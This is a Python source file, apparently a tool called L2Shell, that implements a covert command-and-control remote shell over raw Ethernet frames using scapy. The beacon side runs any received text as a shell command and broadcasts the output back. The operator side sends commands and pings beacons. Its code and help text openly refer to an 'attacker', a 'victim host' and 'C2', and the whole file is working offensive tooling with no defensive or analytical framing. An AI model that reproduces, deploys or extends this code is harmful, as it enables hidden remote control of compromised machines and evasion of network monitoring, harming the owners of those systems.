import argparse, threading, time
import hashlib
from scapy.all import sniff, Ether, sendp
import subprocess, os

mac_address = "FF:FF:FF:FF:FF:FF" # default return address is broadcast
frame_size  = 1000 # Default frame size is 1500, but if jumbo frames are supported on the network
                   # this can be changed as required.
                  
frame_delay = 0.5      # For chunked responses, could help by spacing out frames
session_id  = "123456" # Id for accessing the session
attacker_id = "zxczxc" # Id for returning information to the attacker server

# Create a hash for C2L2 server
c2_id = hashlib.sha3_256()
c2_id.update(b"Unique_C2_Id_Should_Be_Used")
c2_id = c2_id.hexdigest()

# Create hash of hash
c2_id_r = hashlib.sha3_256()
c2_id_r.update(c2_id.encode('utf-8'))
c2_id_r = c2_id_r.hexdigest()
                 
def send_frame(message, mac_address, sender):
    # Next send the output back to the command server
    frames = [message[i:i+frame_size] for i in range(0, len(message), frame_size)]
    for frame in frames:
        time.sleep(frame_delay)
        frame = sender + frame.decode('utf-8') # Make sure to add the attacker id
        eth_frame = Ether(dst=mac_address) / frame
        
        # Send the Ethernet frame
        with open(os.devnull, 'w') as f:
            sendp(eth_frame, verbose=False)

# Define a callback function to handle each packet
def process_frame(frame):
    if Ether in frame:
        eth_frame = frame[Ether]
        
        if len(eth_frame.payload) > 0:
                
            index = str(eth_frame.payload.original).find(session_id)
            if index != -1:
                print("Source MAC:", eth_frame.src)
                print("Destination MAC:", eth_frame.dst)
                print("Payload Length:", len(eth_frame.payload))
                string = str(eth_frame.payload.original)[index + len(session_id):]
                string = string.strip("'")
                string = string.strip(session_id)
                pad = "\\x00"
                nstring = string.replace(pad, '')
                try:
                    output = subprocess.check_output(nstring.strip("'"), shell=True)
                    print(output.decode("utf-8"))
                    noutput = attacker_id + output.decode("utf-8")
                
                except Exception as e:
                    output = "Error: Invalid Command"
                    noutput = attacker_id + output
                    
                # Next send the output back to the command server
                send_frame(noutput.encode('utf-8'), "FF:FF:FF:FF:FF:FF", attacker_id)
                
            if c2_id.encode("utf-8") in eth_frame.payload.original: # Respond to c2 ping
                # Send frame of c2_id hashed again
                print("pong")
                send_frame(c2_id_r.encode('utf-8'), "FF:FF:FF:FF:FF:FF", attacker_id)             


# This method is the listening server for the attacker host.
def process_return_frame(frame):
    if Ether in frame:
        eth_frame = frame[Ether]
        if eth_frame.dst=="ff:ff:ff:ff:ff:ff": # This needs to be changed or kept default
            
            if len(eth_frame.payload) > 0:
                
                index = str(eth_frame.payload.original).find(attacker_id)
                if c2_id_r.encode("utf-8") in eth_frame.payload.original:
                    print("Beacon: " + "[" + eth_frame.src + "]")
                    index = -1
                
                if index != -1:
                    #print("Source MAC:", eth_frame.src)
                    #print("Destination MAC:", eth_frame.dst)
                    #print("Payload Length:", len(eth_frame.payload))
                    string = str(eth_frame.payload.original)[index + len(attacker_id):]
                    string = string.replace("'", "")
                    pad = "\\x00" # Gets rid of padding
                    returnc = "\\r" # Gets rid of return carriage
                    #nstring = string.replace(attacker_id, '')
                    string = string.strip(attacker_id)
                    
                    nstring = string.replace(returnc, '')
                    nstring = nstring.replace(pad, '')
                    
                    # Attempts to format the terminal items
                    terminal_format = nstring.split('\\n')
                    #print(terminal_format)
                    for line in terminal_format:
                        print(line)
                    
                    print("" + session_id + ">", end='')
                    
                    
def ControlPanel(userin):
    if "enable options" in userin:
        
        while userin != "disable options" or userin != "3":
            print("L2C2 Control Panel: \n")
            print("1) ping beacons")
            print("2) help")
            print("3) disable options")
            print(">", end='')
            userin = input()
            
            if userin == "1":
                print("Pinging Beacons: \n")
                send_frame(c2_id.encode('utf-8'), "FF:FF:FF:FF:FF:FF", "")
                time.sleep(3) # Wait some time for beacons to call home
                
            elif userin == "2":
                print("Select one of the options to configure a beacon, or exit by entering 'disable options'\n")
            
            elif userin == "3":
                userin = "disable options"
                print()
                break
                
            userin = ""

# Sniff Ethernet frames and call the process_packet function for each packet
def listen():
    print("In listen mode: ")
    sniff(prn=process_frame, store=0)
    
def rlisten():
    sniff(prn=process_return_frame, store=0)

# The connect feature can be used to send commands, but also receive info from
# remote computers
def connect():
    # Create an Ethernet frame with custom payload (padding)
    #for test in range(5):
    print("In connect mode: ")
    
    listener_thread = threading.Thread(target=rlisten)
    listener_thread.daemon = True
    listener_thread.start()
    
    userin = ""
    while userin != "x":
        userin += session_id 
        userin += str(input())
                 
        # Make sure the input isn't larger than the set amount
        
        if len(userin) > frame_size:
            print("Error: Input too large...")
        
        ControlPanel(userin)
        
        if userin != session_id and "enable options" not in userin:
            send_frame(userin.encode('utf-8'), mac_address, session_id)
            
        else:
            print("" + session_id + ">", end='')
        
        userin = ''
    exit(0)
    
def main():

    global mac_address
    global session_id
    global attacker_id
    global frame_size
    global frame_delay
    
    parser = argparse.ArgumentParser(epilog="e.g. python3 L2Shell.py -l",)
    parser.add_argument("-l", "--listen", action='store_true', help="Listen for connections")
    parser.add_argument("-c", "--connect", action='store_true', help="Connect and instruct commands")
    parser.add_argument("-m", "--mac", help="beacon mac address", type=str)
    parser.add_argument("-s", "--session", help="session id", type=str, required=True)
    parser.add_argument("-a", "--attacker", help="attacker id", type=str, required=True)
    parser.add_argument("-d", "--delay", help="frame delay for chunked responses", type=int)
    parser.add_argument("-f", "--framesize", help="Sets frame size (victim host)", type=int)
    
    
    args = parser.parse_args()

    if args.mac:
        mac_address = args.mac
        
    if args.delay:
        frame_delay = args.delay    
        
    if args.attacker:
        attacker_id = args.attacker
    
    if args.framesize:
        frame_size = args.framesize
    
    if args.session:
        session_id = args.session
    
    if args.listen:
        listen()
        
    if args.connect:
        connect()
        
    #if args.check

if __name__ == "__main__":
    main()
